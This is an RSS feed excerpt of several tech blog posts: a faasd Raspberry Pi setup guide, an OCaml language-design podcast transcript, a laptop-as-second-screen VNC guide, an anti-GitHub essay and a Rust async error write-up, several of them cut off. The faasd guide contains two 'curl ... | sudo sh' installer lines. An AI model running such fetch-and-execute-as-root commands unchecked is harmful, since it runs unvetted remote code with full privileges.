</code></pre>
<p>Download the faasd binary:</p>
<pre><code>sudo curl -sSLf "https://github.com/openfaas/faasd/releases/download/0.9.5/faasd-armhf" \
    --output "/usr/local/bin/faasd" \
    &amp;&amp; sudo chmod a+x "/usr/local/bin/faasd"
</code></pre>
<p>Now run the installation:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir -p $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas

git clone https://github.com/openfaas/faasd --depth=1

cd faasd

sudo faasd install
</code></pre>
<h2 id="postinstall">Post-install</h2>
<p>The <code>faasd install</code> command creates two systemd unit files which can be used to start/stop <code>faasd</code> and <code>faasd-provider</code>.</p>
<h3 id="checktheinstallation">Check the installation</h3>
<p>Check the services:</p>
<pre><code>sudo systemctl status faasd
sudo systemctl status faasd-provider
</code></pre>
<p>Find logs:</p>
<pre><code>sudo journalctl -u faasd --lines 40
sudo journalctl -u faasd-provider --lines 40
</code></pre>
<p>You'll find your login details for the gateway in <code>/var/lib/faasd/secrets</code>, the user is <code>admin</code> and the password is in <code>/var/lib/faasd/secrets/basic-auth-password</code></p>
<h3 id="checkthelogsfromtheopenfaascoreservices">Check the logs from the OpenFaaS Core Services</h3>
<p>You can access the logs from any of the core services deployed with faasd as follows:</p>
<pre><code>sudo journalctl -t default:gateway --lines 40
sudo journalctl -t default:nats --lines 40
sudo journalctl -t default:queue-worker --lines 40
sudo journalctl -t default:prometheus --lines 40
</code></pre>
<p>For more, see the <code>docker-compose.yaml</code> file in the current directory.</p>
<h3 id="accessopenfaasfromyourlaptop">Access OpenFaaS from your laptop</h3>
<p>faasd deploys OpenFaaS along with its core logic <code>faasd-provider</code>, which uses containerd instead of Kubernetes to start, stop, and manage functions.</p>
<p>The <code>faasd</code> process will proxy any incoming requests on HTTP port 8080 to the OpenFaaS gateway container, you can also find the IP of the container in your <code>hosts</code> file in the <code>faasd</code> directory.</p>
<p>You can also access the built-in Prometheus container by editing <code>docker-compose.yaml</code> to expose its ports, either to 127.0.0.1, or all your network adapters.</p>
<h3 id="deployafunctionfromthestore">Deploy a function from the store</h3>
<p>Obtain your OpenFaaS password. You need to run this command on your Raspberry Pi:</p>
<pre><code>sudo cat /var/lib/faasd/secrets/basic-auth-password
</code></pre>
<p>Log in to the gateway, either on your RPi, or from your own computer.</p>
<pre><code># If connecting remotely
export IP=192.168.0.101
export OPENFAAS_URL=http://$IP:8080
echo $PASSWORD | faas-cli login

# Or on device:

sudo cat /var/lib/faasd/secrets/basic-auth-password | faas-cli login --password-stdin
</code></pre>
<p>Look at what's available in the function store for the armhf platform, then deploy something:</p>
<pre><code>faas-cli store list --platform armhf

# Deploy figlet
faas-cli store deploy --platform armhf figlet

# Find the URLs for the function
faas-cli store inspect figlet

# Create some ASCII

echo "faasd" | faas-cli invoke figlet
</code></pre>
<p>Try a function that can generate an <code>identicon</code> like you may have seen for default avatar logos on GitHub.com</p>
<pre><code>faas-cli store deploy --platform armhf identicon

echo $USER | faas-cli invoke identicon &gt; avatar.png
</code></pre>
<p>Here's an example of the avatar for the user <code>pi</code>:</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/avatar.png" alt="avatar"></p>
<h3 id="runanasyncfunction">Run an async function</h3>
<p>You can also run your functions in the background or asynchronously.</p>
<p>Create a webhook receiver using a public service such as:</p>
<ul>
<li><a href="https://requestbin.com/">https://requestbin.com/</a></li>
<li><a href="https://postb.in/">https://postb.in/</a></li>
</ul>
<pre><code>faas-cli store deploy --platform armhf nodeinfo

curl -d "verbose" \
  http://127.0.0.1:8080/async-function/nodeinfo \
  --header "X-Callback-Url: https://postb.in/1578562711776-8760500776115"
</code></pre>
<p>You'll be able to refresh your webhook receiver and see the value.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/Screenshot-2020-01-09-at-09.41.11.png" alt="Screenshot-2020-01-09-at-09.41.11"></p>
<h3 id="buildanewcontainerimage">Build a new container image</h3>
<p>You'll need a second Raspberry Pi for this step since we do not have <code>docker</code> installed on the device.</p>
<p>There are a couple of workarounds if you don't have a second device: use buildkit per as my post <a href="https://blog.alexellis.io/building-containers-without-docker/">Building containers without Docker</a>. Or build on your PC using <a href="https://github.com/alexellis/multiarch-templates">one of my multi-arch templates</a>.</p>
<p>You can also use one of my prebuilt functions such as <a href="https://github.com/alexellis/2020/">ascii-2020</a>, but you should only run the <code>faas-cli deploy</code> step.</p>
<ul>
<li>
<p>Log into the Raspberry Pi with <code>ssh</code> and install the <code>faas-cli</code> and <code>docker</code>.</p>
<pre><code>curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<pre><code>curl -sLfS https://get.docker.com | sudo sh

sudo usermod -aG docker pi
newgrp
</code></pre>
</li>
<li>
<p>Log into the Docker Hub</p>
<pre><code>docker login
</code></pre>
</li>
<li>
<p>Create a Golang function</p>
<pre><code>export DOCKER_HUB_NAME="alexellis2"

faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  hello-world \
  --prefix $DOCKER_HUB_NAME
</code></pre>
</li>
<li>
<p>Now build and push the image</p>
<pre><code>faas-cli push -f hello-world.yml
faas-cli deploy -f hello-world.yml
</code></pre>
</li>
</ul>
<h3 id="deployyournewcontainer">Deploy your new container</h3>
<p>You can set your OpenFaaS …</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexellis.io/faasd-for-lightweight-serverless/">https://blog.alexellis.io/faasd-for-lightweight-serverless/</a></em></p>]]>
            </description>
            <link>https://blog.alexellis.io/faasd-for-lightweight-serverless/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24877846</guid>
            <pubDate>Sat, 24 Oct 2020 08:48:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Language Design with Leo White]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24876465">thread link</a>) | @bshanks
<br/>
October 23, 2020 | https://signalsandthreads.com/language-design/ | <a href="https://web.archive.org/web/*/https://signalsandthreads.com/language-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<h2 id="000000">00:00:00</h2>

<div><p>Welcome to Signals And Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky. </p><p> Today, we’re going to have a conversation about programming language design with Leo White. Leo works in our compilers team here at Jane Street, and he works mostly on what’s called the frontend of the compiler, which means he spends a lot of time thinking about language features and about the type system that supports those language features, and in particular, he does that work in OCaml, which is the programming language we use on a day-to-day basis. </p><p> So, Leo, to get started, I’m curious, can you tell us a little bit about how you got involved in all of this? How you got involved in programming language design, in the first place?</p></div>

<h2 id="0000400">00:00:40.0</h2>

<div><p>I had some interest in programming languages from a young age. I started programming at 11 or something, and then I think I was fairly interested in how these mysterious things were created. The most formative thing I can think of in this regard, is between my first and second years at university, I remember reading Benjamin Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/"><em>Types and Programming Languages</em></a>. That really clicked. I just thought that stuff was great and I just really wanted work on it, and explore those ideas. </p><p> So, I think that’s kind of one of the main things that got me into it. I knew I wanted to do some programming language stuff, I started doing a PhD in that area. It was more about compilation than programming language design, and I was working on a source-to-source C compiler, and I was writing that compiler in OCaml, because OCaml had a good library for reading C files, and I already knew Standard ML, because it’s what they teach you in the first year at Cambridge. So, anyways, I was using OCaml to write this compiler, and I realized that there was a language feature that I wanted to have that would make it easier for me to write this C compiler, and since I kind of hated the work I was doing on the C compiler and was not that interested in it, I procrastinated by adding this feature to OCaml instead. And that’s kind of how I got into writing code for the OCaml compiler. So, I was writing, this language feature and went through the process of trying to upstream it, and whilst I was doing that and my PhD was coming to an end, Anil Madhavapeddy was looking around for people to join OCaml Labs, which was this new project to work on the OCaml compiler that Jane Street was kind of funding in Cambridge. So, he was trying to look for people to work on the OCaml compiler and suddenly this Cambridge address shows up with the implementing language features for OCaml and so he thought, well, I should go and see this person. So, he got in touch with me. And that’s kind of how I started working at OCaml Labs as an RA after having finished my PhD.</p></div>

<h2 id="0002195">00:02:19.5</h2>

<p>It’s by the way worth noting that most people have the wisdom to not immediately go and dive into adding features to languages that they’re just starting to use, and in particular, diving into the type system. I think when Anil saw someone who was willing to just going in and add a new type system feature, he was pretty excited.</p>

<h2 id="0002346">00:02:34.6</h2>

<p>Yes. I did not realize at the time that this wasn’t something that you just did. Yes, I was somewhat under-supervised in my PhD and clearly, no one told me that this is a terrible idea, and a bad way to spend your time. So, I just went ahead and did it instead, and I really enjoyed it. I mean, it’s quite a terrible…like, the type system is hard to dive into. I would not recommend doing it without some assistance.</p>

<h2 id="0002568">00:02:56.8</h2>

<p>The thing you mentioned about how you got involved in OCaml, is the thing that’s always worried me a little bit about how languages are designed, which is to say, languages are almost inevitably designed by people who write compilers, and so, they go around and look at the features they would like for writing compilers and go ahead and add them to the language, and I always wondered, like, how much of a bias is this in how our languages are designed?</p>

<h2 id="0003178">00:03:17.8</h2>

<p>I would say, not much of one mostly, because that is probably a fair accusation of OCaml, which is very nice for writing compilers and has all the things you would want for writing a compiler, but that is not true of most languages. Most languages are kind of horrible to write compilers in, so I don’t think it’s applying there.</p>

<h2 id="0003327">00:03:32.7</h2>

<p>So, you got excited about programming language design from reading <em>Types and Programming Languages</em>, which is Benjamin Pierce’s extremely famous book in this area, or at least extremely famous in an extremely narrow group of people, and you’ve been doing it now for quite a while. Some of that work during your PhD. Some at OCaml Labs, and a bunch of it here, in the intermediate time. What do you find exciting about language design? Why do you like it?</p>

<h2 id="0003550">00:03:55.0</h2>

<p>One of the main things I think I like about language design is that it sits at an interesting intersection between some very interesting pure mathematics, especially on the type system design side of things, and a more aesthetic, kind of, design style. A lot of it is about trying to find things that fit within the mathematical constraints, but are also a design that people like aesthetically and enjoy using.</p>

<h2 id="0004166">00:04:16.6</h2>

<p>And this is one of the real challenges of programming language design. It is really not, at its heart, a scientific enterprise, or at least, not at the end. This is a thing you often hear programming language people complain about, is the fact that they can’t do any proper studies, or rather, whether they can or can’t do it, that in practice, that is not how the field is driven.</p>

<h2 id="0004365">00:04:36.5</h2>

<p>Some people do try and do studies in how effective a programming language is, but it kind of hits up against all the things that make it hard to do experiments in the social sciences. It’s just seems like, in principle, you can manage it, but the experiments are just very hard to do, right? What you really need to do is get a load of professional programmers to agree to use all these different languages to solve the same problems for a prolonged period of time, and clearly this isn’t going to happen.</p>

<h2 id="0004566">00:04:56.6</h2>

<p>Yeah, it does seem completely and utterly hopeless to me because, if the things you care about are what you can do in a programming language, with large groups of people, solving hard problems, with significant amounts of time being devoted to it, which seems like, to me, at least, the interesting problem, and I think, a problem that a lot of programming languages are not even motivated by, you just have no hope. Like the kind of experiments people can run in practice, are like, they grab the thing they have at hand, which is usually a collection of sophomores, and then they study the thing that they can, which is something like how easy is it to understand the very first errors they see in their language or like, how well do they do when they try and do stuff in their first few weeks or maybe few months of working at it. And that just doesn’t get at the actual thing you care about when you think about what makes programming effective in the real world.</p>

<h2 id="0005434">00:05:43.4</h2>

<div><p>This kind of genuinely bothers quite a lot of people, I think, who work in programming languages. They really would much prefer that it were a proper science. It’s much better thought of as a kind of intersection between some mathematics and design. </p><p> And those are both things that we know how to study, right? The scientific method is not the only approach to knowledge. With mathematics, you can try to prove useful theorems and interesting properties, and people successfully do research in design disciplines like, my favorite example is really architecture, which I think is a very similar area to programming language design, in that it’s kind of constrained by mathematics. You know, you have to make sure the building stays up and also, is interesting from a design perspective. You know, you want to make buildings that people enjoy being in and looking at, and so on.</p></div>

<h2 id="0006249">00:06:24.9</h2>

<p>And there’s more than just the raw structural things you have to check. When you think about the design of a building, you think about what are transit times, and people do all sorts of studies to try get feels for how effective it is, but in the end, no one thinks that the final way to figure out whether a building is good is to do a randomized control trial, where you’re like, you make four different buildings and you have this, this and this. You have four equivalent businesses that you sit in the four different buildings and you see how it goes. And I think the scale of the economic investment required, I’m not sure if it’s not quite as absurd or a little more absurd to do the programming language equivalent, but it’s up there.</p>

<h2 id="0007013">00:07:01.3</h2>

<p>I think that that’s a better way of looking at programming language design, as a discipline.</p>

<h2 id="0007068">00:07:06.8</h2>

<p>You know, there are two ways of handling design problems. One is, you can solve them in the market, right? You can, you know, go off and have people go and design programming languages and see which are successful, and we have that down. There’s a whole system for doing that. And then there’s an academic equivalent of this, and a lot of the work on OCaml, in particular, happens in a context which includes a lot of academic stuff. Do you have a feel for how you would make things like evaluation of papers different than it is now in order to accommodate for this?</p>

<h2 id="0007335">00:07:33.5</h2>

<div><p>I don’t have concrete suggestions. I’ve always wanted to, actually seriously, look into disciplines like architecture and so on, and look at how they, I mean they have journals. They have assessment of things. There must be mechanisms by which they do this, but I’ve never actually sat down and put serious time into seeing what that is. </p><p> I’m kind of more struck by the fact that when you’re at, say ICFP, which is the main functional …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://signalsandthreads.com/language-design/">https://signalsandthreads.com/language-design/</a></em></p>]]>
            </description>
            <link>https://signalsandthreads.com/language-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24876465</guid>
            <pubDate>Sat, 24 Oct 2020 02:34:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Old Laptops as Secondary Monitors]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 40 (<a href="https://news.ycombinator.com/item?id=24875533">thread link</a>) | @HaoZeke
<br/>
October 23, 2020 | https://rgoswami.me/posts/laptop-as-second-screens/ | <a href="https://web.archive.org/web/*/https://rgoswami.me/posts/laptop-as-second-screens/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless sceen</p></div></div>]]>
            </description>
            <link>https://rgoswami.me/posts/laptop-as-second-screens/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24875533</guid>
            <pubDate>Fri, 23 Oct 2020 23:33:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Important Open Source projects should not use GitHub]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 9 (<a href="https://news.ycombinator.com/item?id=24874987">thread link</a>) | @mrzool
<br/>
October 23, 2020 | https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html | <a href="https://web.archive.org/web/*/https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>
<ul>
<li><a href="https://codeberg.org/">Codeberg</a><br>Codeberg is a registered German non-profit organization and I think it is the best alternative. Codeberg does not depend on external services. No third party cookies, no tracking. Hosted in the EU.<br>Relevant discussion on <a href="https://news.ycombinator.com/item?id=22795930">Hacker News</a>. Relevant <a href="https://codeberg.org/codeberg/org/src/branch/master/PrivacyPolicy.md">Privacy Policy</a></li>
<li><a href="https://notabug.org/">NotABug</a><br>NotABug.org is run by <a href="https://peers.community/">Peers</a>, a group of people interested in free software and free society. It is mostly for small projects though. Relevant <a href="https://notabug.org/tos">Privacy Policy</a>.</li>
<li><a href="https://sourcehut.org/">sourcehut</a><br>sourcehut is currently considered alpha and it is not going to stay free, but it does not have any tracking or advertising. All features work without JavaScript. Relevant <a href="https://man.sr.ht/privacy.md">Privacy Policy</a>. Relevant discussion on <a href="https://news.ycombinator.com/item?id=23030489">Hacker News</a>. After signing up you get the following message: <q>Payment is optional during the alpha, but be aware that it will become mandatory later. This service is funded by its users, not by investors.</q></li>
</ul>
<p>A few good solutions for self-hosting (not an exhaustive list):</p>
<ul>
<li><a href="https://gogs.io/">Gogs</a> - old discussion at <a href="https://news.ycombinator.com/item?id=11374003">Hacker News</a></li>
<li><a href="https://gitea.io/en-US/">Gitea</a> a community-managed fork of Gogs - discussed at <a href="https://news.ycombinator.com/item?id=17006503">Hacker News</a></li>
<li><a href="https://github.com/theonedev/onedev">OneDev</a> - discussed at <a href="https://news.ycombinator.com/item?id=22081419">Hacker News</a></li>
</ul>
</article></div>]]>
            </description>
            <link>https://unixsheikh.com/articles/important-open-source-projects-should-not-use-github.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874987</guid>
            <pubDate>Fri, 23 Oct 2020 22:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging async generator errors in Rust]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24874283">thread link</a>) | @jamii
<br/>
October 23, 2020 | https://meltware.com/2020/10/21/rust-async-nonsense.html? | <a href="https://web.archive.org/web/*/https://meltware.com/2020/10/21/rust-async-nonsense.html?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>My colleague <a href="http://mattjibson.com/">Matt Jibson</a> and I recently found ourselves
in the unfortunate situation of debugging this hefty async/await-related error
from the Rust compiler:</p>

<div><div><pre><code>error[E0277]: `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)` cannot be shared between threads safely
   --&gt; src/materialized/src/mux.rs:138:100
    |
138 |       async fn handle_connection(&amp;self, conn: SniffedStream&lt;TcpStream&gt;) -&gt; Result&lt;(), anyhow::Error&gt; {
    |  ____________________________________________________________________________________________________^
139 | |         self.handle_connection(conn).await
140 | |     }
    | |_____^ `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)` cannot be shared between threads safely
    |
    = help: the trait `std::marker::Sync` is not implemented for `(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)`
    = note: required because of the requirements on the impl of `std::marker::Sync` for `std::ptr::Unique&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;`
    = note: required because it appears within the type `std::boxed::Box&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;`
    = note: required because it appears within the type `std::option::Option&lt;std::boxed::Box&lt;(dyn futures::Stream&lt;Item = std::result::Result&lt;std::vec::Vec&lt;repr::Row&gt;, comm::Error&gt;&gt; + std::marker::Send + std::marker::Unpin + 'static)&gt;&gt;`
    = note: required because it appears within the type `coord::session::Portal`
    = note: required because of the requirements on the impl of `std::marker::Send` for `&amp;coord::session::Portal`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::describe_portal::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:std::string::String for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::describe_portal::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:std::string::String for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, std::string::String, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut coord::SessionClient, coord::SessionClient, &amp;'t0 coord::session::Session, &amp;'t1 mut coord::session::Session, &amp;'t2 str, &amp;'t3 std::string::String, std::option::Option&lt;&amp;'t4 coord::session::Portal&gt;, tokio_postgres::error::sqlstate::SqlState, impl futures::Future, (), &amp;'t7 coord::session::Portal, impl futures::Future}]&gt;`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `impl futures::Future`
